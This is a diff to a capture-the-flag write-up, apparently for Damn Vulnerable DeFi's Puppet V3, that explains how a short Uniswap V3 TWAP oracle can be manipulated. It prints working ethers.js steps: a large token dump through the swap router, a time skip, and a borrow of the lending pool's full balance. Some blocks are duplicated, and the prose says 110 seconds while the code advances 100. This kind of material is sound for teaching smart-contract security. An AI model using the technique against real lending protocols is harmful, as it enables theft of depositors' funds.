@@ -147,22 +147,45 @@ Remember that the calculations use the last price of an asset at the previous bl
 
 # Subverting
 
-The lending pool contract leverages Uniswap V3's liquidity pool Oracle function, which employs a Time Weighted Average Price (TWAP) methodology for determining the price of DVT in relation to WETH. Unlike traditional methods that rely on the current reserve amounts, TWAP considers historical data spanning a defined time frame, typically 10 minutes in this instance, to compute the average price within that specific duration.
+The lending pool contract leverages Uniswap V3's liquidity pool Oracle function, which employs a TWAP methodology for determining the price of DVT in relation to WETH. Unlike traditional methods that rely on the current reserve amounts, TWAP considers historical data spanning a defined time frame, typically 10 minutes in this instance, to compute the average price within that specific duration.
 
-In this challenge, the exploit is simply that the TWAP of 10 minutes is not long enough to mitigate short-term volatility. In the constraints of the solution, we are required to steal all funds from the lending pool in less than 115 seconds which is just under 20% of the TWAP period.
+This challenge involves exploiting the fact that a 10-minute TWAP is not effective in reducing short-term volatility. The task at hand is to take all the funds from the lending pool in less than 115 seconds, which is almost 20% of the TWAP period, as stipulated in the solution's constraints.
 
-
-
-
-Here are the attacker commands:
-
-```shell
-yarn add @uniswap/swap-router-contracts
-```
+To perform the swap, we must connect the `Uniswap V3 router`. The router will perform complex calculations to enhance user experience instead of directly interacting with Uniswap V3 pools. We can obtain the official Uniswap V3 router address from the Uniswap documentation and connect to it, just as we connect to the existing Uniswap V3 Factory in the challenge setup.
 
 ```js
-const routerJson = require('@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json');
+const uniswapRouterAddress = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
+const uniswapRouter = new ethers.Contract(uniswapRouterAddress, routerJson.abi, player);
 ```
+
+After then, we will approve the router to take our DVT tokens for the trade and then perform the swap.
+
+```js
+await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+await uniswapRouter.exactInputSingle(
+    [token.address,
+    weth.address,   
+    3000,
+    player.address,
+    PLAYER_INITIAL_TOKEN_BALANCE,
+    0,
+    0],
+    {
+gasLimit: 1e7
+    }
+);
+```
+
+We should wait for a little while to give the new price more influence in the calculation. As per the challenge's constraints, we only have 115 seconds, so we can skip ahead 110 seconds, leaving us with enough time to complete any other necessary transactions, such as approvals and swaps. 
+
+Next, we approve that amount to be transferred to the contract and then execute the borrow() function.
+
+```js
+await time.increase(100);
+await weth.connect(player).approve(lendingPool.address, await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
+await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+```
+
 
 Here are the attacker commands:
 
@@ -185,6 +208,16 @@ gasLimit: 1e7
 await time.increase(100);
 await weth.connect(player).approve(lendingPool.address, await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
 await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+```
+
+Install dependencies and import swap router's json.
+
+```shell
+yarn add @uniswap/swap-router-contracts
+```
+
+```js
+const routerJson = require('@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json');
 ```
 
 Solve the challenge.
